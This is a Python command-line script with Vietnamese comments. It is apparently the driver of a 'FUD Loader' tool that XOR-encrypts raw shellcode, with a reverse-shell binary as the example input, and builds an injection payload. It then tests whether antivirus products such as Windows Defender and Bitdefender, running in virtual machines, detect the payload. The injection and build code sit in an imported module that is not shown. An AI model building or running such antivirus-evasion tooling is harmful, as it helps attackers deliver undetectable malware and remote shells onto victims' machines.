import argparse
import os
import core_engine # Import engine cốt lõi của chúng ta

def main():
    # Định nghĩa các đối số dòng lệnh mà người dùng có thể nhập
    parser = argparse.ArgumentParser(description="FUD Loader - Command-Line Test Runner")
    parser.add_argument("-s", "--shellcode", required=True, help="Path to the raw shellcode file (e.g., shellcodes/revshell_x64.bin)")
    parser.add_argument("-e", "--encryption", default="xor", choices=["none", "xor"], help="Encryption method to use.")
    parser.add_argument("-i", "--injection", default="classic", choices=["classic"], help="Injection technique to use.")
    parser.add_argument("-v", "--vms", required=True, nargs='+', help="List of VMs to test on, separated by spaces (e.g., \"Windows Defender\" Bitdefender).")
    parser.add_argument("--debug", action="store_true", help="Build the payload in debug mode (with popups).")

    args = parser.parse_args()

    # --- Bắt đầu quy trình ---
    print("="*50)
    print("      FUD AUTOMATED TEST RUNNER - CLI MODE")
    print("="*50)

    # 1. Kiểm tra xem tên VM người dùng nhập có trong config không
    for vm_name in args.vms:
        if vm_name not in core_engine.VMS_CONFIG:
            print(f"[!] Error: VM name '{vm_name}' is not defined in core_engine.py's VMS_CONFIG.")
            return

    # 2. Xây dựng payload
    build_options = {
        'encryption': args.encryption,
        'injection': args.injection,
        'debug': args.debug
    }
    
    payload_path = core_engine.build_payload(args.shellcode, build_options)

    if not payload_path:
        print("[!] Payload build failed. Aborting test run.")
        return

    # 3. Chạy test trên từng VM đã chọn
    all_results = {}
    for vm_name in args.vms:
        result = core_engine.run_single_test(vm_name, payload_path, build_options)
        all_results[vm_name] = result

    # 4. In báo cáo cuối cùng
    print("\n" + "="*50)
    print("                 FINAL REPORT")
    print("="*50)
    for vm_name, result in all_results.items():
        print(f"--- VM: {vm_name} ---")
        print(f"Status: {result['status']}")
        if result['status'] == 'FAILED':
            print("Log Details:")
            print(result['log'])
        print("-" * (len(vm_name) + 8))

if __name__ == "__main__":
    # Đảm bảo các thư mục cần thiết tồn tại
    os.makedirs('build', exist_ok=True)
    os.makedirs('output', exist_ok=True)
    os.makedirs('uploads', exist_ok=True)
    os.makedirs('test_logs', exist_ok=True)
    
    main()